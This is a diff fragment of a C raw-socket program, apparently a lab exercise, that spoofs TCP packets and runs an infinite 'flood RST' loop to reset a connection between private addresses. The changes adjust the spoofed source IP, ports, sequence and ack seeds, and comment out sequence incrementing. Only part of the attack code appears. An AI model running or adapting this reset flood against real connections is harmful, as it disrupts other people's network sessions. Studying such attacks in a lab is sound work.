@@ -61,14 +61,14 @@ int main(int argc, char *argv[])
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    char *srcIP = "172.19.3.82";
+    char *srcIP = "10.0.2.2";
     char *dstIP = "10.0.2.15";
     uint16_t srcPort = 35801;
-    uint16_t svrPort = 35801;
-    uint32_t seq0 = 84544002;
-    uint32_t ack0 = 3213134409;
+    uint16_t dstPort = 35801;
+    uint32_t seq0 = 0;
+    uint32_t ack0 = 322274747;
     uint16_t id0 = 56;
-    uint16_t window_size = 29200;
+    uint16_t window_size = 8192;
     size_t tcp_len;
     void *data;
     struct sockaddr_in sa;
@@ -87,7 +87,7 @@ int main(int argc, char *argv[])
 
     // build sockaddr
     sa.sin_family = AF_INET;
-    sa.sin_port = htons(svrPort);
+    sa.sin_port = htons(dstPort);
     inet_pton(AF_INET, dstIP, &(sa.sin_addr.s_addr));
 
     // carve out IP header and TCP header
@@ -121,7 +121,7 @@ int main(int argc, char *argv[])
     
     // pack TCP header
     tcph -> source = htons(srcPort); // source port
-    tcph -> dest = htons(svrPort); // destination port
+    tcph -> dest = htons(dstPort); // destination port
     tcph -> seq = 0; // sequence number initially set to 0
     tcph -> ack_seq = 0; // ack sequence number
     tcph -> res1 = 0;
@@ -153,8 +153,8 @@ int main(int argc, char *argv[])
     // flood RST
     while(1)
     {
-        tcph -> seq = htonl(seq0++); // set seq number
-        cstcph -> seq = htonl(seq0); // set seq number in the checksum header
+        // tcph -> seq = htonl(seq0++); // set seq number
+        // cstcph -> seq = htonl(seq0); // set seq number in the checksum header
         tcph -> ack_seq = htonl(ack0++); // set ack seq number
         cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
         tcph -> check = 0; // reset check sum
